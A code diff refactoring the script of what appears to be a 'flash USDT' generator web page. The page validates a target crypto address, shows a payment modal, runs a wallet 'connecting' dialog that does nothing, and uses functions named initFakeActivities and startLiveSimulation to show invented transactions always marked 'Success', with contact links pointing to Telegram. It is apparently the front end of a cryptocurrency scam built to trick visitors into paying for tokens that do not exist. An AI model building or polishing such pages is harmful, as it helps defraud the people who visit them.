+            $('connectBtn').addEventListener('click', ()=>{
+                document.getElementById('generator').scrollIntoView({ behavior: 'smooth' });
+            });
+
+            $('closeWalletModal')?.addEventListener('click', ()=>closeModal('walletModal'));
+
+            $$('.wallet-option').forEach(opt => {
+                opt.addEventListener('click', ()=>{
+                    closeModal('walletModal');
+                    openModal('connectingModal');
+                    setTimeout(()=>closeModal('connectingModal'), 1500);
+                });
+            });
+
+            // Bottom navigation
+            $$('.nav-item').forEach(btn => {
+                btn.addEventListener('click', ()=>{
+                    $$('.nav-item').forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    let panel = btn.dataset.panel;
+                    $$('.panel').forEach(p => p.classList.remove('active'));
+                    $(panel + 'Panel').classList.add('active');
+                    
+                    if (panel === 'activity') {
+                        renderActivities();
                     }
                 });
-            }
-
-            var generateBtn = document.getElementById('generateBtn');
-            if (generateBtn) {
-                generateBtn.addEventListener('click', function () {
-                    var addrInput = document.getElementById('targetAddress');
-                    var errEl = document.getElementById('addressError');
-                    var addr = addrInput ? addrInput.value.trim() : '';
-
-                    if (!addr) {
-                        if (errEl) { errEl.style.display = 'block'; errEl.innerText = 'Enter target address'; }
-                        return;
-                    }
-                    var ok =
-                        /^0x[a-fA-F0-9]{40}$/.test(addr) ||
-                        /^T[a-zA-Z0-9]{33}$/.test(addr) ||
-                        /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr) ||
-                        /^ltc1[a-zA-Z0-9]{39}$/.test(addr) ||
-                        /^r[a-zA-Z0-9]{24,34}$/.test(addr);
-                    if (!ok) {
-                        if (errEl) { errEl.style.display = 'block'; errEl.innerText = 'Invalid address format'; }
-                        return;
-                    }
-                    if (errEl) errEl.style.display = 'none';
-
-                    var fa = document.getElementById('paymentFlashAmount');
-                    var pn = document.getElementById('paymentNetwork');
-                    var pta = document.getElementById('paymentTargetAddr');
-                    var pd = document.getElementById('paymentDuration');
-                    if (fa) fa.innerText = fmt(state.selectedAmount) + ' USDT';
-                    if (pn) pn.innerText = state.selectedNetwork;
-                    if (pta) pta.innerText = shortAddr(addr);
-                    if (pd) pd.innerText = formatDuration(state.selectedDuration);
-
-                    updatePaymentDisplay(state.selectedCrypto);
-                    var pm = document.getElementById('paymentModal');
-                    if (pm) pm.classList.add('active');
-                });
-            }
-
-            function openModal(id) { var m = document.getElementById(id); if (m) m.classList.add('active'); }
-            function closeModal(id) { var m = document.getElementById(id); if (m) m.classList.remove('active'); }
-
-            var cpm = document.getElementById('closePaymentModal');
-            if (cpm) cpm.addEventListener('click', function () { closeModal('paymentModal'); });
-
-            var ctm = document.getElementById('closeTxModal');
-            if (ctm) ctm.addEventListener('click', function () { closeModal('txModal'); });
-
-            var cwm = document.getElementById('closeWalletModal');
-            if (cwm) cwm.addEventListener('click', function () { closeModal('walletModal'); });
-
-            var connectBtn = document.getElementById('connectBtn');
-            if (connectBtn) {
-                connectBtn.addEventListener('click', function () {
-                    var gen = document.getElementById('generator');
-                    if (gen) gen.scrollIntoView({ behavior: 'smooth' });
-                });
-            }
-
-            var walletOpts = $$('.wallet-option');
-            for (var wi = 0; wi < walletOpts.length; wi++) {
-                (function (opt) {
-                    opt.addEventListener('click', function () {
-                        closeModal('walletModal');
-                        openModal('connectingModal');
-                        setTimeout(function () { closeModal('connectingModal'); }, 1500);
-                    });
-                })(walletOpts[wi]);
-            }
-
-            var navItems = $$('.nav-item');
-            for (var bi = 0; bi < navItems.length; bi++) {
-                (function (btn) {
-                    btn.addEventListener('click', function () {
-                        var all = $$('.nav-item');
-                        for (var j = 0; j < all.length; j++) all[j].classList.remove('active');
-                        btn.classList.add('active');
-                        var panel = btn.dataset.panel;
-                        var panels = $$('.panel');
-                        for (var k = 0; k < panels.length; k++) panels[k].classList.remove('active');
-                        var target = document.getElementById(panel + 'Panel');
-                        if (target) target.classList.add('active');
-                        if (panel === 'activity') renderActivities();
-                    });
-                })(navItems[bi]);
-            }
+            });
 
             function renderActivities() {
-                var list = document.getElementById('activityList');
-                if (!list) return;
+                let list = $('activityList');
                 if (!state.activities.length) {
                     list.innerHTML = '<div class="empty-state">No transactions yet</div>';
                     return;
                 }
-                var html = '';
-                for (var i = 0; i < state.activities.length; i++) {
-                    var a = state.activities[i];
-                    html += '<div class="activity-item">' +
-                        '<div class="activity-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>' +
-                        '<div class="activity-info">' +
-                            '<div class="activity-title">' + a.title + '</div>' +
-                            '<div class="activity-meta">' + a.hash + '</div>' +
-                        '</div>' +
-                        '<div class="activity-value">' +
-                            '<div class="activity-amount">+' + fmt(a.amount) + ' USDT</div>' +
-                            '<div class="activity-status">Success</div>' +
-                        '</div>' +
-                    '</div>';
-                }
-                list.innerHTML = html;
+                list.innerHTML = state.activities.map(a => `
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                            </svg>
+                        </div>
+                        <div class="activity-info">
+                            <div class="activity-title">${a.title}</div>
+                            <div class="activity-meta">${a.hash}</div>
+                        </div>
+                        <div class="activity-value">
+                            <div class="activity-amount">+${fmt(a.amount)} USDT</div>
+                            <div class="activity-status">Success</div>
+                        </div>
+                    </div>
+                `).join('');
             }
 
-            document.addEventListener('click', function (e) {
+            // Close dropdowns on outside click
+            document.addEventListener('click', (e) => {
                 if (!e.target.closest('.custom-select')) {
-                    var cs = $$('.custom-select');
-                    for (var i = 0; i < cs.length; i++) cs[i].classList.remove('open');
+                    $$('.custom-select').forEach(s => s.classList.remove('open'));
                 }
                 if (!e.target.closest('.payment-custom-select')) {
-                    var pcs = $$('.payment-custom-select');
-                    for (var j = 0; j < pcs.length; j++) pcs[j].classList.remove('open');
+                    $$('.payment-custom-select').forEach(s => s.classList.remove('open'));
                 }
             });
 
-            var tgLinks = document.querySelectorAll('a[href*="t.me/"]');
-            for (var ti = 0; ti < tgLinks.length; ti++) {
-                tgLinks[ti].href = 'https://t.me/' + telegramUsername;
-            }
+            // Update all Telegram links with the username
+            document.querySelectorAll('a[href*="t.me/"]').forEach(link => {
+                link.href = `https://t.me/${telegramUsername}`;
+            });
 
-            try {
-                initFakeActivities();
-                startLiveSimulation();
-                updateSummary();
-                renderActivities();
+            // Initialize
+            initFakeActivities();
+            startLiveSimulation();
+            updateSummary();
+            renderActivities();
+
+            
+            setTimeout(() => {
                 updatePaymentDisplay(state.selectedCrypto);
-            } catch (e) {
-                console.error('Init error', e);
-            }
-
-            detectCountryAndApply();
+            }, 500);
         })();
     </script>
 </body>
